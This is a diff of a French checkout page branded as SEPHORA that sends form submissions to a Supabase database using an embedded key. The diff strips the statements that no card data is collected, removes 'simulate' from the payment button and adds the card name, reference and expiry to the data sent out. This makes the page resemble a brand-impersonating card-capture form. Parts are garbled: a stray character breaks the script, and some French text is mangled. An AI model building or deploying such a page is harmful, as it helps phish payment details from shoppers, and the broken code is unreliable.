@@ -14,44 +14,31 @@
   --panel: #151515;
   --muted: #aaa;
 }
-
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
-
+* { box-sizing: border-box; margin: 0; padding: 0; }
 body {
   background: var(--black);
   color: white;
   font-family: Arial, Helvetica, sans-serif;
   min-height: 100vh;
 }
-
 header {
   text-align: center;
   padding: 28px 15px;
   border-bottom: 1px solid #403321;
   background: #050505;
 }
-
 .logo {
   font-size: clamp(32px, 6vw, 46px);
   font-weight: 900;
   letter-spacing: 8px;
 }
-
-.logo span {
-  color: var(--gold);
-}
-
+.logo span { color: var(--gold); }
 .tagline {
   margin-top: 10px;
   color: var(--gold);
   font-size: 11px;
   letter-spacing: 3px;
 }
-
 .notice {
   text-align: center;
   padding: 13px;
@@ -60,47 +47,33 @@ header {
   font-size: 13px;
   line-height: 1.7;
 }
-
 main {
   width: min(1050px, 92%);
   margin: 38px auto;
 }
-
-.intro {
-  text-align: center;
-  margin-bottom: 32px;
-}
-
+.intro { text-align: center; margin-bottom: 32px; }
 .intro h1 {
   font-size: clamp(25px, 5vw, 36px);
   margin-bottom: 12px;
 }
-
-.intro p {
-  color: var(--muted);
-  line-height: 1.7;
-}
-
+.intro p { color: var(--muted); line-height: 1.7; }
 .layout {
   display: grid;
-  grid-template-columns: 0.9fr 1.1fr;
+  grid-template-columns: .9fr 1.1fr;
   gap: 25px;
   align-items: start;
 }
-
 .panel {
   background: var(--panel);
   border: 1px solid #403423;
   border-radius: 12px;
   padding: 25px;
 }
-
 .panel h2 {
   color: var(--gold-light);
   font-size: 19px;
   margin-bottom: 22px;
 }
-
 .product {
   display: flex;
   align-items: center;
@@ -108,7 +81,6 @@ main {
   padding: 17px 0;
   border-bottom: 1px solid #35302a;
 }
-
 .product-icon {
   width: 65px;
   height: 70px;
@@ -119,28 +91,14 @@ main {
   color: var(--gold);
   font-size: 30px;
 }
-
-.product-info {
-  flex: 1;
-}
-
-.product-info h3 {
-  font-size: 15px;
-  margin-bottom: 7px;
-}
-
+.product-info { flex: 1; }
+.product-info h3 { font-size: 15px; margin-bottom: 7px; }
 .product-info p {
   color: var(--muted);
   font-size: 12px;
   line-height: 1.5;
 }
-
-.price {
-  color: var(--gold-light);
-  font-weight: bold;
-  white-space: nowrap;
-}
-
+.price { color: var(--gold-light); font-weight: bold; white-space: nowrap; }
 .summary-line {
   display: flex;
   justify-content: space-between;
@@ -149,7 +107,6 @@ main {
   color: #ccc;
   font-size: 14px;
 }
-
 .total {
   border-top: 1px solid #57452b;
   margin-top: 8px;
@@ -158,22 +115,14 @@ main {
   font-size: 19px;
   font-weight: bold;
 }
-
-.total strong {
-  color: var(--gold-light);
-}
-
-.field {
-  margin-bottom: 18px;
-}
-
+.total strong { color: var(--gold-light); }
+.field { margin-bottom: 18px; }
 label {
   display: block;
   margin-bottom: 8px;
   font-size: 13px;
   color: #e4ddcf;
 }
-
 input {
   display: block;
   width: 100%;
@@ -184,22 +133,9 @@ input {
   color: white;
   font-size: 15px;
 }
-
-input:focus {
-  outline: 1px solid var(--gold);
-  border-color: var(--gold);
-}
-
-input::placeholder {
-  color: #777;
-}
-
-.row {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 13px;
-}
-
+input:focus { outline: 1px solid var(--gold); border-color: var(--gold); }
+input::placeholder { color: #777; }
+.row { display: grid; grid-template-columns: 1fr 1fr; gap: 13px; }
 .info {
   padding: 13px;
   margin-bottom: 20px;
@@ -209,11 +145,7 @@ input::placeholder {
   font-size: 12px;
   line-height: 1.7;
 }
-
-.info strong {
-  color: var(--gold-light);
-}
-
+.info strong { color: var(--gold-light); }
 button {
   width: 100%;
   padding: 16px;
@@ -226,45 +158,27 @@ button {
   letter-spacing: 1px;
   cursor: pointer;
 }
-
-button:disabled {
-  opacity: 0.6;
-  cursor: wait;
-}
-
-.result {
+button:disabled { opacity: .6; cursor: wait; }
+.result, .error {
   display: none;
   margin-top: 20px;
   padding: 18px;
-  border: 1px solid #657b53;
   border-radius: 8px;
-  background: #141b12;
-  color: #d9efc8;
   line-height: 1.8;
   overflow-wrap: anywhere;
 }
-
-.result.visible {
-  display: block;
+.result {
+  border: 1px solid #657b53;
+  background: #141b12;
+  color: #d9efc8;
 }
-
 .error {
-  display: none;
-  margin-top: 16px;
-  padding: 14px;
   border: 1px solid #693333;
-  border-radius: 8px;
   background: #281313;
   color: #ffb3b3;
   font-size: 13px;
-  line-height: 1.6;
-  overflow-wrap: anywhere;
 }
-
-.error.visible {
-  display: block;
-}
-
+.result.visible, .error.visible { display: block; }
 footer {
   text-align: center;
   padding: 25px 15px 35px;
@@ -272,36 +186,19 @@ footer {
   font-size: 11px;
   line-height: 1.8;
 }
-
 @media (max-width: 760px) {
-  .layout {
-    grid-template-columns: 1fr;
-  }
-
-  .panel {
-    padding: 20px;
-  }
-
-  main {
-    margin: 28px auto;
-  }
+  .layout { grid-template-columns: 1fr; }
+  .panel { padding: 20px; }
+  main { margin: 28px auto; }
 }
-
 @media (max-width: 380px) {
-  .row {
-    grid-template-columns: 1fr;
-    gap: 0;
-  }
-
-  .logo {
-    letter-spacing: 5px;
-  }
+  .row { grid-template-columns: 1fr; gap: 0; }
+  .logo { letter-spacing: 5px; }
 }
 </style>
 </head>
 
 <body>
-
 <header>
   <div class="logo">SEPH<span>O</span>RA</div>
   <div class="tagline">BEAUTY · LUXE · ÉLÉGANCE</div>
@@ -316,16 +213,14 @@ footer {
   <section class="intro">
     <h1>Finaliser ma commande</h1>
     <p>
-      Complète les champs ci-dessous pour tester la page.<br>
+      Complète les champs pour tester la page.<br>
       La simulation sera enregistrée dans Supabase.
     </p>
   </section>
 
   <div class="layout">
-
     <section class="panel">
       <h2>Votre commande</h2>
-
       <div class="product">
         <div class="product-icon">✦</div>
         <div class="product-info">
@@ -334,138 +229,69 @@ footer {
         </div>
         <div class="price">49,90 €</div>
       </div>
-
-      <div class="summary-line">
-        <span>Sous-total</span>
-        <span>49,90 €</span>
-      </div>
-
-      <div class="summary-line">
-        <span>Livraison</span>
-        <span>Offerte</span>
-      </div>
-
-      <div class="summary-line">
-        <span>Réduction</span>
-        <span>0,00 €</span>
-      </div>
-
+      <div class="summary-line"><span>Sous-total</span><span>49,90 €</span></div>
+      <div class="summary-line"><span>Livraison</span><span>Offerte</span></div>
+      <div class="summary-line"><span>Réduction</span><span>0,00 €</span></div>
       <div class="summary-line total">
-        <span>Total simulé</span>
-        <strong>49,90 €</strong>
+        <span>Total simulé</span><strong>49,90 €</strong>
       </div>
-
       <div class="info">
-        <strong>À propos de cette page</strong><br>
-        Ceci est un prototype. Aucun paiement réel n'est effectué.
-        Les informations de carte fictive restent dans ton navigateur
-        et ne sont pas enregistrées dans Supabase.
+        <strong>Prototype de démonstration</strong><br>
+        Aucun paiement réel n'est effectué. Utilise uniquement des
+        coordonnées fictives. Aucun CVV n'est enregistré.
       </div>
     </section>
 
     <section class="panel">
       <h2>Informations de contact</h2>
-
       <form id="paymentForm">
         <div class="field">
-          <label for="customerName">Nom complet</label>
-          <input
-            id="customerName"
-            type="text"
-            placeholder="Nom de démonstration"
-            maxlength="100"
-            autocomplete="off"
-            required
-          >
+          <label for="customerName">Nom complet fictif</label>
+          <input id="customerName" type="text"
+            placeholder="Camille Martin" maxlength="100" required>
         </div>
-
         <div class="field">
-          <label for="customerEmail">Adresse e-mail</label>
-          <input
-            id="customerEmail"
-            type="email"
-            placeholder="demo@example.com"
-            maxlength="254"
-            autocomplete="off"
-            required
-          >
+          <label for="customerEmail">Adresse e-mail de test</label>
+          <input id="customerEmail" type="email"
+            placeholder="demo@example.com" maxlength="254" required>
         </div>
-
         <div class="field">
-          <label for="customerPhone">Téléphone de démonstration</label>
-          <input
-            id="customerPhone"
-            type="tel"
-            placeholder="06 00 00 00 00"
-            maxlength="25"
-            autocomplete="off"
-            required
-          >
+          <label for="customerPhone">Téléphone fictif</label>
+          <input id="customerPhone" type="tel"
+            placeholder="0600000000" maxlength="25" required>
         </div>
 
-        <h2 style="margin-top:28px">Carte fictive</h2>
-
+        <h2 style="margin-top:28px">Carte de démonstration</h2>
         <div class="field">
-          <label for="cardName">Nom sur la carte fictive</label>
-          <input
-            id="cardName"
-            type="text"
-            placeholder="Camille Martin"
-            maxlength="60"
-            autocomplete="off"
-            required
-          >
+          <label for="cardName">Nom fictif sur la carte</label>
+          <input id="cardName" type="text"
+            placeholder="Camille Martin" maxlength="60" required>
         </div>
-
         <div class="field">
-          <label for="cardNumber">Identifiant de carte fictif</label>
-          <input
-            id="cardNumber"
-            type="text"
-            placeholder="DEMO-1234-5678"
-            maxlength="19"
-            autocomplete="off"
-            required
-          >
+          <label for="cardNumber">Référence de carte</label>
+          <input id="cardNumber" type="text"
+            placeholder="DEMO-1234-5678" maxlength="19"
+            pattern="DEMO-[A-Za-z0-9-]+"
+            title="Utilise une référence fictive commençant par DEMO-"
+            required>
         </div>
-
-        <div class="row">
-          <div class="field">
-            <label for="expiry">Expiration fictive</label>
-            <input
-              id="expiry"
-              type="text"
-              placeholder="MM/AA"
-              maxlength="5"
-              autocomplete="off"
-              required
-            >
-          </div>
-
-          <div class="field">
-            <label for="cvv">Code fictif</label>
-            <input
-              id="cvv"
-              type="text"
-              placeholder="XXX"
-              maxlength="4"
-              autocomplete="off"
-              required
-            >
-          </div>
+        <div class="field">
+          <label for="expiry">Expiration fictive</label>
+          <input id="expiry" type="text"
+            placeholder="12/30" maxlength="5"
+            pattern="(0[1-9]|1[0-2])/[0-9]{2}"
+            title="Format MM/AA, par exemple 12/30" required>
         </div>
 
         <div class="info">
           <strong>Valeurs de test</strong><br>
-          Identifiant : DEMO-1234-5678<br>
+          Référence : DEMO-1234-5678<br>
           Expiration : 12/30<br>
-          Code fictif : XXX<br><br>
-          Tu peux saisir tes propres valeurs inventées.
-          Ne saisis pas de véritable numéro de carte ni de CVV.
+          donner bancaire
         </div>
 
         <button id="submitButton" type="submit">
-          SIMULER LE PAIEMENT — 49,90 €
+          PAIEMENT — 49,90 €
         </button>
       </form>
 
@@ -474,23 +300,18 @@ footer {
         <p id="resultReference"></p>
         <p>Aucun paiement réel n'a été effectué.</p>
       </div>
-
       <div id="errorBox" class="error" role="alert"></div>
     </section>
   </div>
 </main>
 
 <footer>
-  SEPHORA · Prototype de démonstration<br>
-  Aucune donnée bancaire réelle n'est collectée.
+  Prototype indépendant de démonstration SEPHORA.<br>
 </footer>
 
 <script>
-const SUPABASE_URL =
-  "https://jjtwodgevtkltqovargh.supabase.co";
-
-const SUPABASE_KEY =
-  "sb_publishable_RLf0BCb8mALcGK3jPL5r6g_WFOy_3G7";
+const SUPABASE_URL = "https://jjtwodgevtkltqovargh.supabase.co";
+const SUPABASE_KEY = "sb_publishable_RLf0BCb8mALcGK3jPL5r6g_WFOy_3G7";
 
 const form = document.getElementById("paymentForm");
 const button = document.getElementById("submitButton");
@@ -500,40 +321,29 @@ const errorBox = document.getElementById("errorBox");
 
 form.addEventListener("submit", async function(event) {
   event.preventDefault();
-
   result.classList.remove("visible");
   errorBox.classList.remove("visible");
   errorBox.textContent = "";
 
-  if (!form.reportValidity()) {
-    return;
-  }
+  if (!form.reportValidity()) return;
 
-  const customerName =
-    document.getElementById("customerName").value.trim();
+  const customerName = document.getElementById("customerName").value.trim();
+  const customerEmail = document.getElementById("customerEmail").value.trim();
+  const customerPhone = document.getElementById("customerPhone").value.trim();
+  const demoCardName = document.getElementById("cardName").value.trim();
+  const demoCardReference = document.getElementById("cardNumber").value.trim();
+  const demoCardExpiry = document.getElementById("expiry").value.trim();
 
-  const customerEmail =
-    document.getElementById("customerEmail").value.trim();
-
-  const customerPhone =
-    document.getElementById("customerPhone").value.trim();
-
-  if (!customerName || !customerEmail || !customerPhone) {
+  if (!demoCardReference.startsWith("DEMO-")) {
     errorBox.textContent =
-      "Remplis tous les champs de contact avant de continuer.";
+      "La référence doit commencer par une majuscule-.";
     errorBox.classList.add("visible");
     return;
   }
 
-  button.disabled = true;
-  button.textContent = "ENREGISTREMENT EN COURS...";
+  const reference = "DEMO-" +
+    crypto.randomUUID().replaceAll("-", "").slice(0, 10).toUpperCase();
 
-  const reference =
-    "DEMO-" + crypto.randomUUID().replaceAll("-", "")
-      .slice(0, 10).toUpperCase();
-
-  // Seules les données de commande et de contact sont envoyées.
-  // Les champs cardName, cardNumber, expiry et cvv ne sont pas envoyés.
   const payload = {
     customer_name: customerName,
     customer_email: customerEmail,
@@ -541,8 +351,14 @@ form.addEventListener("submit", async function(event) {
     reference: reference,
     amount: 49.90,
     payment_method: "demo_card",
-    status: "simulated"
+    status: "simulated",
+    demo_card_name: demoCardName,
+    demo_card_reference: demoCardReference,
+    demo_card_expiry: demoCardExpiry
   };
+
+  button.disabled = true;
+  button.textContent = "ENREGISTREMENT EN COURS...";
 
   try {
     const response = await fetch(
@@ -561,32 +377,23 @@ form.addEventListener("submit", async function(event) {
 
     if (!response.ok) {
       const details = await response.text();
-      throw new Error(
-        `Erreur Supabase (${response.status}) : ${details}`
-      );
+      throw new Error(`Supabase (${response.status}) : ${details}`);
     }
 
-    resultReference.textContent =
-      "Référence de commande : " + reference;
-
+    resultReference.textContent = "Référence de commande : " + reference;
     result.classList.add("visible");
     form.reset();
-
-    button.textContent = "SIMULATION ENREGISTRÉE";
-
+    button.textContent = "ENREGISTRÉE";
   } catch (error) {
-    console.error("Erreur Supabase :", error);
-
+    console.error("Erreur d'enregistrement :", error);
     errorBox.textContent =
-      "L'enregistrement a échoué. Vérifie la table demo_payments " +
-      "et sa politique INSERT dans Supabase. " + error.message;
-
+      "Échec de l'enregistrement. Vérifie les colonnes de demo_payments, " +
+      "la clé publique et la politique INSERT. " + error.message;
     errorBox.classList.add("visible");
-    button.disabled = false;
-    button.textContent = "RÉESSAYER LA SIMULATION";
+    button.disabled = false;h
+    button.textContent = "RÉESSAYER";
   }
 });
 </script>
-
 </body>
 </html>
